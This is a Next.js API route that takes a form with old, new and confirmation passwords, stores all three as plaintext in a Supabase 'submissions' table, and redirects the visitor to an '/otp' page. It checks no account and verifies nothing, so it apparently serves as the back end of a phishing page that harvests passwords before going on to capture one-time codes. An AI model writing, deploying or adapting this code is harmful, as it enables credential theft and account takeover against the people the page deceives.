import { createClient } from '@supabase/supabase-js';

export const config = {
  api: {
    bodyParser: false,
  },
};

const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL,
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY
);

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.status(405).json({ error: 'Method Not Allowed' });
    return;
  }

  let body = '';

  req.on('data', chunk => {
    body += chunk.toString();
  });

  req.on('end', async () => {
    try {
      const parsed = new URLSearchParams(body);
      const oldpass = parsed.get('oldpass');
      const newpass = parsed.get('newpass');
      const confirmpass = parsed.get('confirmpass');

      const { error } = await supabase.from('submissions').insert([
        { oldpass, newpass, confirmpass }
      ]);

      if (error) {
        console.error('❌ Supabase insert error:', error); // ✅ You’ll now see the real issue
        res.status(500).json({ error: 'Failed to save data' });
      } else {
        res.writeHead(302, { Location: '/otp' });
        res.end();
      }
    } catch (err) {
      console.error('❌ Unexpected error:', err);
      res.status(500).json({ error: 'Unexpected server error' });
    }
  });

  req.on('error', (err) => {
    console.error('❌ Request error:', err);
    res.status(500).json({ error: 'Request stream error' });
  });
}
